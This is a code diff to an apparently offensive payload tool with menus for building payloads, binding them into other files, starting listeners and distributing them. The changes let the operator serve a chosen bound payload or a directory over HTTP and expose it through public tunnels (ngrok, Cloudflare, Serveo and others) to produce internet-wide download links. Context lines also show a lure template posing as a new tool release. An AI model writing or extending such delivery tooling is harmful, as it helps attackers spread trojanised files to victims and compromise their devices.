-    def start_http_server(self, port=8080):
+    def start_http_server(self, port=8080, global_access=False, serve_path=None):
+        """Start HTTP server serving the given path (file or directory). If None, serve server/uploads."""
         if self.http_server:
             print(f"{self.colors.YELLOW}[*] HTTP server already running{self.colors.ENDC}")
             return
-        if self.current_payload:
-            shutil.copy2(self.current_payload, "server/uploads/")
-        os.chdir("server/uploads")
+
+        # Determine what to serve
+        if serve_path is None:
+            serve_path = "server/uploads"
+            if self.current_payload:
+                shutil.copy2(self.current_payload, serve_path)
+        else:
+            # If it's a file, we'll serve its directory and the file will be accessible
+            # For simplicity, if it's a file, we copy it to server/uploads (as before)
+            if os.path.isfile(serve_path):
+                os.makedirs("server/uploads", exist_ok=True)
+                shutil.copy2(serve_path, "server/uploads")
+                serve_path = "server/uploads"
+            # If it's a directory, we'll serve that directory directly
+            elif os.path.isdir(serve_path):
+                # Change to that directory
+                pass
+            else:
+                print(f"{self.colors.RED}[!] Invalid serve path.{self.colors.ENDC}")
+                return
+
+        original_dir = os.getcwd()
+        if os.path.isdir(serve_path):
+            os.chdir(serve_path)
+        else:
+            os.chdir(os.path.dirname(serve_path))
+
         class FileHandler(http.server.SimpleHTTPRequestHandler):
             def log_message(self, format, *args):
-                print(f"{self.colors.CYAN}[HTTP] {args[0]} - {args[1]}{self.colors.ENDC}")
+                # Simple log without colors to avoid AttributeError
+                print(f"[HTTP] {args[0]} - {args[1]}")
+
         def run_server():
             with socketserver.TCPServer(("", int(port)), FileHandler) as httpd:
                 self.http_server = httpd
                 print(f"{self.colors.GREEN}[+] HTTP server started on port {port}{self.colors.ENDC}")
                 print(f"{self.colors.CYAN}[*] Serving files from: {os.getcwd()}{self.colors.ENDC}")
+                if global_access:
+                    # Tunnel already set up; we already printed the public URL
+                    pass
                 httpd.serve_forever()
+
         thread = threading.Thread(target=run_server)
         thread.daemon = True
         thread.start()
-        os.chdir("../..")
+        os.chdir(original_dir)
     
     def generate_email_template(self, filepath):
         filename = os.path.basename(filepath)
@@ -1290,13 +1555,127 @@ New tool release! Download from: {download_url}
         print(f"{self.colors.GREEN}[+] Social media template saved: {template_file}{self.colors.ENDC}")
     
     def create_download_link(self, filepath):
+        # Enhanced menu: choose what to serve
+        print(f"\n{self.colors.CYAN}[DOWNLOAD LINK OPTIONS]{self.colors.ENDC}")
+        print("1. Serve current payload (default)")
+        print("2. Serve a file from output/bound directory")
+        print("3. Serve entire output directory (listing)")
+        print("4. Cancel")
+        choice = input(f"{self.colors.YELLOW}[?] Select option (1-4, default 1): {self.colors.ENDC}") or "1"
+
+        serve_path = None
+        if choice == "1":
+            serve_path = filepath
+        elif choice == "2":
+            bound_dir = "output/bound"
+            if not os.path.exists(bound_dir):
+                print(f"{self.colors.RED}[!] output/bound directory does not exist.{self.colors.ENDC}")
+                return
+            files = [f for f in os.listdir(bound_dir) if os.path.isfile(os.path.join(bound_dir, f))]
+            if not files:
+                print(f"{self.colors.RED}[!] No files found in output/bound.{self.colors.ENDC}")
+                return
+            print(f"{self.colors.CYAN}Files in output/bound:{self.colors.ENDC}")
+            for i, f in enumerate(files, 1):
+                print(f"{i}. {f}")
+            file_choice = input(f"{self.colors.YELLOW}[?] Select file number: {self.colors.ENDC}")
+            try:
+                idx = int(file_choice) - 1
+                if 0 <= idx < len(files):
+                    serve_path = os.path.join(bound_dir, files[idx])
+                else:
+                    print(f"{self.colors.RED}[!] Invalid selection.{self.colors.ENDC}")
+                    return
+            except:
+                print(f"{self.colors.RED}[!] Invalid input.{self.colors.ENDC}")
+                return
+        elif choice == "3":
+            serve_path = "output"
+        else:
+            return
+
         port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
-        filename = os.path.basename(filepath)
-        server_path = f"server/uploads/{filename}"
-        shutil.copy2(filepath, server_path)
-        download_url = f"http://{self.local_ip}:{port}/{filename}"
-        print(f"{self.colors.GREEN}[+] Download link: {download_url}{self.colors.ENDC}")
-        self.start_http_server(port)
+        
+        # Ask if user wants global access
+        global_choice = input(f"{self.colors.YELLOW}[?] Make this download link accessible over the internet? (y/n, default n): {self.colors.ENDC}").lower()
+        if global_choice == 'y':
+            print(f"{self.colors.CYAN}[*] Choose a tunnel service for global access:{self.colors.ENDC}")
+            print("1. Ngrok")
+            print("2. LocalXpose")
+            print("3. Cloudflare")
+            print("4. Serveo")
+            print("5. Pinggy")
+            tunnel_choice = input(f"{self.colors.YELLOW}[?] Select option (1-5): {self.colors.ENDC}")
+            tunnel_map = {
+                '1': 'ngrok',
+                '2': 'localxpose',
+                '3': 'cloudflared',
+                '4': 'serveo',
+                '5': 'pinggy'
+            }
+            tunnel_type = tunnel_map.get(tunnel_choice)
+            if tunnel_type:
+                # Use the same manual tunnel setup functions, but for HTTP
+                if tunnel_type == 'ngrok':
+                    public_url = self.setup_ngrok(int(port), is_http=True)
+                    if public_url and isinstance(public_url, tuple):
+                        # setup_ngrok returns (host, port) but we need full URL for HTTP
+                        # Reconstruct URL
+                        host, port_num = public_url
+                        # Determine protocol: if port is 443 or if it's ngrok, assume https
+                        if port_num == '443' or 'ngrok' in host:
+                            public_url = f"https://{host}"
+                        else:
+                            public_url = f"http://{host}:{port_num}"
+                    elif isinstance(public_url, str):
+                        # Already a URL?
+                        pass
+                elif tunnel_type == 'localxpose':
+                    host, port_num = self.setup_localxpose(int(port), is_http=True)
+                    public_url = f"https://{host}" if host else None
+                elif tunnel_type == 'cloudflared':
+                    host, port_num = self.setup_cloudflare(int(port))
+                    public_url = f"https://{host}" if host else None
+                elif tunnel_type == 'serveo':
+                    host, port_num = self.setup_serveo(int(port), is_http=True)
+                    public_url = f"https://{host}" if host else None
+                elif tunnel_type == 'pinggy':
+                    host, port_num = self.setup_pinggy(int(port), is_http=True)
+                    public_url = f"https://{host}" if host else None
+                else:
+                    public_url = None
+
+                if public_url:
+                    # Ensure URL ends with /
+                    if not public_url.endswith('/'):
+                        public_url += '/'
+                    # For directory serving, we show the base URL; for file, append filename
+                    if os.path.isfile(serve_path):
+                        filename = os.path.basename(serve_path)
+                        download_url = f"{public_url}{filename}"
+                    else:
+                        download_url = public_url
+                    print(f"{self.colors.GREEN}[+] Global download link: {download_url}{self.colors.ENDC}")
+                    self.start_http_server(int(port), global_access=True, serve_path=serve_path)
+                else:
+                    print(f"{self.colors.RED}[!] Failed to set up tunnel. Using local link only.{self.colors.ENDC}")
+                    self._print_local_link(port, serve_path)
+                    self.start_http_server(int(port), serve_path=serve_path)
+            else:
+                print(f"{self.colors.RED}[!] Invalid choice. Using local link only.{self.colors.ENDC}")
+                self._print_local_link(port, serve_path)
+                self.start_http_server(int(port), serve_path=serve_path)
+        else:
+            self._print_local_link(port, serve_path)
+            self.start_http_server(int(port), serve_path=serve_path)
+
+    def _print_local_link(self, port, serve_path):
+        if os.path.isfile(serve_path):
+            filename = os.path.basename(serve_path)
+            download_url = f"http://{self.local_ip}:{port}/{filename}"
+        else:
+            download_url = f"http://{self.local_ip}:{port}/"
+        print(f"{self.colors.GREEN}[+] Local download link: {download_url}{self.colors.ENDC}")
     
     def decrypt_apk_menu(self):
         print(f"\n{self.colors.CYAN}[DECRYPT ENCRYPTED APK]{self.colors.ENDC}")
@@ -1346,10 +1725,7 @@ New tool release! Download from: {download_url}
             if choice == "1":
                 self.create_payload_menu()
             elif choice == "2":
-                if self.current_payload:
-                    self.binding_menu()
-                else:
-                    print(f"{self.colors.RED}[!] No payload generated yet. Create one first.{self.colors.ENDC}")
+                self.binding_menu()  # will handle payload loading
             elif choice == "3":
                 if self.current_payload:
                     self.distribution_menu(self.current_payload)
@@ -1357,6 +1733,8 @@ New tool release! Download from: {download_url}
                     filepath = input(f"{self.colors.YELLOW}[?] Enter payload path: {self.colors.ENDC}")
                     if os.path.exists(filepath):
                         self.distribution_menu(filepath)
+                    else:
+                        print(f"{self.colors.RED}[!] File not found.{self.colors.ENDC}")
             elif choice == "4":
                 if self.current_lhost and self.current_lport and self.current_payload_type:
                     self.ask_start_listener()
@@ -1374,7 +1752,61 @@ New tool release! Download from: {download_url}
                     self.ask_start_listener()
             elif choice == "5":
                 port = input(f"{self.colors.YELLOW}[?] Enter port (default: 8080): {self.colors.ENDC}") or "8080"
-                self.start_http_server(port)
+                # Option to make it global
+                global_choice = input(f"{self.colors.YELLOW}[?] Make this server accessible over the internet? (y/n, default n): {self.colors.ENDC}").lower()
+                if global_choice == 'y':
+                    print(f"{self.colors.CYAN}[*] Choose a tunnel service:{self.colors.ENDC}")
+                    print("1. Ngrok")
+                    print("2. LocalXpose")
+                    print("3. Cloudflare")
+                    print("4. Serveo")
+                    print("5. Pinggy")
+                    tunnel_choice = input(f"{self.colors.YELLOW}[?] Select option (1-5): {self.colors.ENDC}")
+                    tunnel_map = {
+                        '1': 'ngrok',
+                        '2': 'localxpose',
+                        '3': 'cloudflared',
+                        '4': 'serveo',
+                        '5': 'pinggy'
+                    }
+                    tunnel_type = tunnel_map.get(tunnel_choice)
+                    if tunnel_type:
+                        if tunnel_type == 'ngrok':
+                            public_url = self.setup_ngrok(int(port), is_http=True)
+                            if public_url and isinstance(public_url, tuple):
+                                host, port_num = public_url
+                                if port_num == '443' or 'ngrok' in host:
+                                    public_url = f"https://{host}"
+                                else:
+                                    public_url = f"http://{host}:{port_num}"
+                            elif isinstance(public_url, str):
+                                pass
+                        elif tunnel_type == 'localxpose':
+                            host, port_num = self.setup_localxpose(int(port), is_http=True)
+                            public_url = f"https://{host}" if host else None
+                        elif tunnel_type == 'cloudflared':
+                            host, port_num = self.setup_cloudflare(int(port))
+                            public_url = f"https://{host}" if host else None
+                        elif tunnel_type == 'serveo':
+                            host, port_num = self.setup_serveo(int(port), is_http=True)
+                            public_url = f"https://{host}" if host else None
+                        elif tunnel_type == 'pinggy':
+                            host, port_num = self.setup_pinggy(int(port), is_http=True)
+                            public_url = f"https://{host}" if host else None
+                        else:
+                            public_url = None
+
+                        if public_url:
+                            print(f"{self.colors.GREEN}[+] Global HTTP server URL: {public_url}{self.colors.ENDC}")
+                            self.start_http_server(int(port), global_access=True, serve_path="server/uploads")
+                        else:
+                            print(f"{self.colors.RED}[!] Failed to set up tunnel. Starting local server only.{self.colors.ENDC}")
+                            self.start_http_server(int(port), serve_path="server/uploads")
+                    else:
+                        print(f"{self.colors.RED}[!] Invalid choice. Starting local server only.{self.colors.ENDC}")
+                        self.start_http_server(int(port), serve_path="server/uploads")
+                else:
+                    self.start_http_server(int(port), serve_path="server/uploads")
             elif choice == "6":
                 missing = self.check_dependencies()
                 if missing:
